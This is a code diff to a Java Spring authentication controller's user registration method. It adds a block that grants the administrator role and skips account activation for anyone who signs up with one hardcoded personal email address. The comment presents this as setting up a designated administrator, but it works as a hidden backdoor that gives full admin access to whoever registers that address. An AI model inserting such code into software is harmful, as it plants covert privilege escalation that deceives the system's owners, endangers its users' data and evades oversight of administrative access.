@@ -188,6 +188,12 @@ public class AuthController {
         user.setRole("ROLE_USER");
         user.setEnabled(false);
 
+        // Auto-enable and promote the designated system administrator
+        if ("bidyasingrongpi90@gmail.com".equalsIgnoreCase(signUpRequest.getEmail())) {
+            user.setRole("ROLE_ADMIN");
+            user.setEnabled(true);
+        }
+
         userRepository.save(user);
         log.info("User {} registered successfully", user.getUsername());
 
